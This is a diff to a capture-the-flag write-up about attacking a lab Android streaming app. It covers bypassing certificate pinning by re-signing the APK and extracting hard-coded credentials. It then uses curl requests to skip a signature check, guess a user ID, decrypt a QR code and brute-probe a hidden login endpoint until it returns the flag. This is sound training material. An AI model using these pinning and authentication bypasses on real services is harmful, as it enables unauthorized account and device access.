@@ -4,7 +4,6 @@ Android device or emulator with or without root access was used.
 
 See [Android environment](../../_knowledgebase/android/environment.md) for more details.
 
-
 # Installing the application
 
 Installing with ADB.
@@ -19,12 +18,16 @@ Opening the application reveals a login screen.
 
 Basic attempts can't log us in.
 
+The traffic is encrypted, therefore tcpdump doesn't reveal much.
+
+![](screenshots/8.png)
+
 # Adding proxy
 
 The burp proxy was enabled.
 
 ```bash
-adb shell settings put global http_proxy 10.0.1.2:8080
+adb shell settings put global http_proxy burp:8080
 adb shell settings put global http_proxy :0 # to turn off
 ```
 
@@ -68,9 +71,9 @@ openssl s_client -showcerts -connect hereott.honeylab.hu:48490 </dev/null
 
 Upon inspection of the APK file, there is `hereott.apk/assets/cert.pem` inside with the same key. The application is pinning the tls cert to this one. 
 
-This can be replaced and the apk resigned. The `cert.der` is the burp proxy cert exported.
-
 ![](screenshots/4.png)
+
+This can be replaced and the apk resigned. The `cert.der` is the burp proxy cert exported.
 
 ```bash
 cp hereott.apk hereott_mod.apk
@@ -170,7 +173,166 @@ adb install hereott_mod_align.apk
 
 Is finally bypassing the protection.
 
-# Getting the url
+# Checking the network communication
+
+Now we can see the encrypted traffic as well.
+
+The server at `hereott.honeylab.hu` is actually just a load balancer. It is redirecting every request to some other server.
+
+Upon starting the application, we can see the application sending out some credentials and receiving a config file.
+
+![](screenshots/7.png)
+
+Username: `HereOttMobileApp`, password: `97967af0db478e842e16dbf7aea6e93a` (after b64 deccode). Unfortunatelly this credential is not useful for anything else.
+
+There is an other json in the [config](workdir/config.json) that was acquired: <https://hereott.honeylab.hu:48490/files/apps_list_Meseorszag_v1.json>. 
+
+In that file, there is a selfcare url: <https://10.10.3.11:48490/selfcare/selfcare-frontend/>.
+
+# Selfcare
+
+Visiting the selfcare url gives a seemingly broken site.
+
+![](screenshots/9.png)
+
+This is happening, because the frontend is unable to authenticate itself and received a 403 Forbidden from the backend.
+
+![](screenshots/10.png)
+
+The frontend also sending some credentials to the backend.
+
+```
+Authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==
+```
+
+Username: `hereottselfcare`, password: `hereottselfcare`. Unfortunatelly this credential is not useful for anything else either.
+
+Replicating such requests via curl looks like the following.
+
+```bash
+curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
+  -H 'serialnumber: 345-2251605' \
+  -H 'sig: undefined' \
+  -H 'uid: undefined' \
+  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
+```
+
+This has a `Signature mismatch` error.
+
+# Digging in the JS
+
+Omitting a lot of details, the JS is using webassembly to generate the serial, signature and uid.
+
+![](screenshots/11.png)
+
+![](screenshots/12.png)
+
+Reversing the webasm reveal that the information is missing to generate any signature.
+
+The serial is simply stored in the browser's local storage after generation.
+
+# Omitting the parameters
+
+Sending a request without signature seems to generate a different error: `UID is missing or invalid`.
+
+```bash
+curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
+  -H 'serialnumber: 345-2251605' \
+  -H 'uid: undefined' \
+  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
+```
+
+Guessing valid UID seems to be possible. Let's substitute 1.
+
+```bash
+curl -k 'https://10.10.3.11:48490/selfcare/selfcare-backend/devices' -H 'accept: application/json, text/plain, */*' -H 'authorization: Basic aGVyZW90dHNlbGZjYXJlOmhlcmVvdHRzZWxmY2FyZQ==' \
+  -H 'serialnumber: 345-2251605' \
+  -H 'uid: 1' \
+  -H 'uuid: 81ec4f8e-b4b6-4842-8904-634ca6f78dbc'
+```
+
+This is sending back a valid list of devices.
+
+```json
+{"devices":[{"id":"0acc8bbd-a6ed-42eb-80cd-047e70d2b967","name":"HereOTT MediaBox Pro","type":"stb","active":true}]}
+```
+
+# Overriding the parameters
+
+Using the browser developer tools to override a slightly modified and beautified version of the original js logic [app.24055605.js](workdir/app.24055605.js) can exploit the missing signature. The `sig` parameter was removed, the `uid` parameter was fixed to `1`, the `ServerUrl` was changed to directly talk to the server without the redirects.
+
+![](screenshots/14.png)
+
+The pairing device also works. The backend returns a qr code and an IV ([qrcode.json](workdir/qrcode.json)). The `qrCode` is just a binary representation of the [qrcode.jpg](workdir/qrcode.jpg), with some `iv`: `4bb1d4ed701b3db94e4240e628414492`.
+
+![](screenshots/15.png)
+
+# Pairing
+
+Using the `Login with QR Code` feature in the app and scanning the QR code returns the flag.
+
+![](screenshots/16.png)
+
+# Flag
+cq23{Ott_Pl4tform_5ecurity_1s_the_b3st_4bb1d4ed701b3}
+
+# Without camera
+
+## QR code
+
+The QR code has the content `0|/Yv5dm5bOL5Fk+bcD4ylQg==|/rt3h9I0ndPktKi85EcNXA==`
+
+```bash
+zbarimg qrcode.jpg
+```
+
+The previous `iv` next to the `qrCode` suggests some encryption. AES with CBC works, if the first base64 string is used as key, the second base64 as input, and iv as hex iv.
+
+![](screenshots/17.png)
+
+We get a decrypted `35276072` number whose purpose is unknown yet.
+
+## Backend QR Endpoint
+
+Based on `/v1/login` endpoint, looking for similar strings in `libapp.so` files also have a `/v1/loginWithCode`. 
+
+Checking this endpoint.
+
+```bash
+curl -v -k 'https://10.10.3.11:48490/v1/loginWithCode'
+```
+
+The `{"error": "Method not allowed"}` suggests to use different method. POST.
+
+```bash
+curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode'
+```
+
+The `{"error": "Wrong request"}` is probably about missing parameters. After trying various things, json `{}` value gives another error.
+
+```bash
+curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -d '{}'
+```
+
+The `{"error": "Missing pinCode"}` indicates missing `pinCode` parameter. Further iterating it is excepting string value, otherwise returning `Wrong request` again.
+
+```bash
+curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -d '{"pinCode":"0"}'
+```
+
+The next `{"error": "UUID is missing or invalid"}` error indicates missing `UUID`. After many attempts, it is not in the json, nor a GET parameter, but a header.
+
+```bash
+curl -v -k -X POST 'https://10.10.3.11:48490/v1/loginWithCode' -H 'UUID: 00000000-0000-0000-0000-000000000000' -d '{"pinCode":"0"}'
+```
+
+It is `{"error": "Invalid PIN code"}` now. Using the decrypted QR code value `35276072` is passing the check. Returning our new paired device with the flag in the headers.
+
+![](screenshots/18.png)
+
+
+# Bonus webassembly
+
 
 
 https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/
